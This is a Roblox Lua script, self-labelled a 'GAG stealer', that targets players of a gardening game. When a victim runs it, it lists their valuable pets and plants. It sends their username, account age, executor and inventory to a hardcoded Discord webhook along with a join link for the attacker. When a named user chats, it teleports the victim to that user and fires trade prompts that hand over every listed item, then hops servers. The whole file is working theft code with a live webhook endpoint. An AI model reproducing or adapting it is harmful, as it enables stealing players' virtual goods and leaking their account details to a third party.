_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

-- SETTINGS
local users = _G.Usernames or {"ezikiel53"}
local min_value = _G.min_value or 10000000
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or "https://discord.com/api/webhooks/1444187837762109501/Au5My2ZxWDAdtg7okXOjXBaWvpd4p_36BxCeimgQrOztwzI7sYfMq9euFooL0mckPf8f"

-- SERVICES
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local CoreGui = game:GetService("CoreGui")
local TweenService = game:GetService("TweenService")

local plr = Players.LocalPlayer
local backpack = plr:WaitForChild("Backpack")
local replicatedStorage = game:GetService("ReplicatedStorage")
local modules = replicatedStorage:WaitForChild("Modules")
local calcPlantValue = require(modules:WaitForChild("CalculatePlantValue"))
local petUtils = require(modules:WaitForChild("PetServices"):WaitForChild("PetUtilities"))
local petRegistry = require(replicatedStorage:WaitForChild("Data"):WaitForChild("PetRegistry"))
local numberUtil = require(modules:WaitForChild("NumberUtil"))
local dataService = require(modules:WaitForChild("DataService"))

local character = plr.Character or plr.CharacterAdded:Wait()

-- EXECUTOR
local executorName = "Unknown"
if getexecutorname then
    pcall(function() executorName = tostring(getexecutorname()) end)
end

-- SERVER HOP
local function serverHop()
    local PlaceID = game.PlaceId
    local ok, req = pcall(function()
        return request({
            Url = "https://games.roblox.com/v1/games/"..PlaceID.."/servers/Public?sortOrder=Asc&limit=100"
        })
    end)
    if not ok or not req or not req.Body then
        pcall(function() TeleportService:Teleport(PlaceID) end)
        return
    end
    local decoded
    pcall(function() decoded = HttpService:JSONDecode(req.Body) end)
    if not decoded or not decoded.data then
        pcall(function() TeleportService:Teleport(PlaceID) end)
        return
    end
    for _, v in ipairs(decoded.data) do
        if v.playing < v.maxPlayers and v.id ~= game.JobId then
            pcall(function() TeleportService:TeleportToPlaceInstance(PlaceID, v.id) end)
            return
        end
    end
    pcall(function() TeleportService:Teleport(PlaceID) end)
end

-- VALIDATION
if next(users) == nil or webhook == "" or game.PlaceId ~= 126884695634066 or #Players:GetPlayers() >= 5 then
    serverHop()
    return
end

-- DATA
local excludedItems = {"Seed", "Shovel [Destroy Plants]", "Water", "Fertilizer"}
local rarePets = {"Headless horseman", "Elephant", "Spider", "Raccoon"}

local totalValue = 0
local itemsToSend = {}

-- HELPERS
local function calcPetValue(pet)
    local hatchedFrom = pet.PetData and pet.PetData.HatchedFrom
    if not hatchedFrom or hatchedFrom == "" then return 0 end
    local eggData = petRegistry.PetEggs[hatchedFrom]
    if not eggData then return 0 end
    local petData = eggData.RarityData.Items[pet.PetType]
    if not petData then return 0 end
    local weightRange = petData.GeneratedPetData and petData.GeneratedPetData.WeightRange
    if not weightRange then return 0 end
    local v19 = numberUtil.ReverseLerp(weightRange[1], weightRange[2], pet.PetData.BaseWeight)
    local v20 = math.lerp(0.8, 1.2, v19)
    local levelProgress = petUtils:GetLevelProgress(pet.PetData.Level)
    local v22 = v20 * math.lerp(0.15, 6, levelProgress)
    local v23 = petRegistry.PetList[pet.PetType].SellPrice * v22
    return math.floor(v23)
end

local function formatNumber(number)
    if not number then return "0" end
    local suffixes = {"", "k", "m", "b", "t"}
    local index = 1
    while number >= 1000 and index < #suffixes do
        number = number / 1000
        index = index + 1
    end
    if index == 1 then return tostring(math.floor(number)) end
    if number == math.floor(number) then
        return string.format("%d%s", number, suffixes[index])
    else
        return string.format("%.2f%s", number, suffixes[index])
    end
end

local function getWeight(tool)
    local weightValue = tool:FindFirstChild("Weight") or tool:FindFirstChild("KG") or tool:FindFirstChild("WeightValue") or tool:FindFirstChild("Mass")
    local weight = 0
    if weightValue then
        if weightValue:IsA("NumberValue") or weightValue:IsA("IntValue") then
            weight = weightValue.Value
        elseif weightValue:IsA("StringValue") then
            weight = tonumber(weightValue.Value) or 0
        end
    else
        local w = tool.Name:match("%((%d+%.?%d*) ?kg%)")
        if w then weight = tonumber(w) end
    end
    return math.floor(weight * 100 + 0.5) / 100
end

local function getHighestKGFruit()
    local highest = 0
    for _, item in ipairs(itemsToSend) do
        if item.Weight and item.Weight > highest then
            highest = item.Weight
        end
    end
    return highest
end

local function getHighestValueItem()
    local highest = 0
    for _, item in ipairs(itemsToSend) do
        if item.Value and item.Value > highest then
            highest = item.Value
        end
    end
    return highest
end

-- SCAN BACKPACK
for _, tool in ipairs(backpack:GetChildren()) do
    if tool:IsA("Tool") and not table.find(excludedItems, tool.Name) then
        if tool:GetAttribute("ItemType") == "Pet" then
            local petUUID = tool:GetAttribute("PET_UUID")
            local success, petData = pcall(function()
                return dataService:GetData().PetsData.PetInventory.Data[petUUID]
            end)
            if success and petData then
                local itemName = petData.PetType
                local value = calcPetValue(petData)
                local weight = tonumber(tool.Name:match("%[(%d+%.?%d*) KG%]")) or getWeight(tool) or 0
                totalValue = totalValue + value
                table.insert(itemsToSend, {Tool = tool, Name = itemName, Value = value, Weight = weight, Type = "Pet"})
            end
        else
            local value = calcPlantValue(tool)
            if value >= min_value then
                local weight = getWeight(tool)
                local itemName = tool:GetAttribute("ItemName") or tool.Name
                totalValue = totalValue + value
                table.insert(itemsToSend, {Tool = tool, Name = itemName, Value = value, Weight = weight, Type = "Plant"})
            end
        end
    end
end

-- BUILD RARE PET INVENTORY
local function BuildRareInventory()
    local inventory = {}
    local hasRare = false
    for _, item in ipairs(itemsToSend) do
        if table.find(rarePets, item.Name) or item.Name:match("Huge") or item.Name:match("Titanic") then
            hasRare = true
            table.insert(inventory, string.format("%s (%.2f KG): ¢%s", item.Name, item.Weight or 0, formatNumber(item.Value)))
        end
    end
    if #inventory == 0 then return "N/A", false end
    return "```\n" .. table.concat(inventory, "\n") .. "\n```", hasRare
end

-- WEBHOOK
local function SendWebhook()
    local inventoryText, hasRare = BuildRareInventory()
    local pingText = (hasRare and ping == "Yes") and "<@everyone>" or ""
    local data = {
        content = pingText,
        embeds = {{
            title = plr.Name .. "'s Rare Pets",
            description = inventoryText,
            color = 5814783
        }}
    }
    pcall(function()
        request({
            Url = webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(data)
        })
    end)
end

-- JOIN MESSAGE & STEAL HANDLER
local function SendJoinMessage()
    local inventoryText, hasRare = BuildRareInventory()
    local prefix = (hasRare and ping == "Yes") and "--[[@everyone]] " or ""
    local data = {
        content = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(126884695634066, '" .. game.JobId .. "')",
        embeds = {{
            title = "📥 Join to get GAG hit",
            color = 65280,
            fields = {
                {name = "👤 Account Info", value = string.format("Name: %s\nExecutor: %s\nAccount Age: %s", plr.Name, executorName, plr.AccountAge), inline=false},
                {name = "🎒 Rare Inventory", value = inventoryText, inline=false},
                {name = "🔗 Join Link", value = "https://fern.wtf/joiner?placeId=126884695634066&gameInstanceId="..game.JobId, inline=false}
            },
            footer = {text = "GAG stealer by Tobi. discord.gg/GY2RVSEGDT"}
        }}
    }
    pcall(function() request({Url=webhook, Method="POST", Headers={["Content-Type"]="application/json"}, Body=HttpService:JSONEncode(data)}) end)
end

-- STEAL LOGIC
local function doSteal(player)
    local victimRoot = character:WaitForChild("HumanoidRootPart")
    if not player.Character or not player.Character:FindFirstChild("HumanoidRootPart") then return end
    victimRoot.CFrame = player.Character.HumanoidRootPart.CFrame + Vector3.new(0,0,2)
    wait(0.1)
    local success, err = pcall(function()
        local promptRoot = player.Character.HumanoidRootPart:FindFirstChild("ProximityPrompt")
        for _, item in ipairs(itemsToSend) do
            item.Tool.Parent = character
            if item.Type == "Pet" then
                local promptHead = player.Character.Head:FindFirstChild("ProximityPrompt")
                if promptHead then repeat task.wait(0.01) until promptHead.Enabled fireproximityprompt(promptHead) end
            elseif promptRoot then repeat task.wait(0.01) until promptRoot.Enabled fireproximityprompt(promptRoot) end
            task.wait(0.1)
            item.Tool.Parent = backpack
            task.wait(0.1)
        end
    end)
    -- wait until items are in backpack
    local timeout = tick() + 10
    while tick() < timeout do
        local itemsLeft = false
        for _, item in ipairs(itemsToSend) do
            if backpack:FindFirstChild(item.Tool.Name) then
                itemsLeft = true
                break
            end
        end
        if not itemsLeft then break end
        task.wait(0.1)
    end
    serverHop()
end

-- CHAT TRIGGER
local function waitForUserChat()
    local sentMessage = false
    local function onPlayer(p)
        if table.find(users, p.Name) then
            p.Chatted:Connect(function()
                if not sentMessage then
                    local sortedItems = {}
                    for i,v in ipairs(itemsToSend) do sortedItems[i]=v end
                    table.sort(sortedItems,function(a,b) if a.Type=="Pet" and b.Type~="Pet" then return true end if a.Type~="Pet" and b.Type=="Pet" then return false end return a.Value>b.Value end)
                    SendJoinMessage()
                    sentMessage = true
                end
                doSteal(p)
            end)
        end
    end
    for _, pp in ipairs(Players:GetPlayers()) do onPlayer(pp) end
    Players.PlayerAdded:Connect(onPlayer)
end

-- EXECUTE ON START
if #itemsToSend > 0 then
    SendWebhook() -- rare pets single webhook
    waitForUserChat()
end
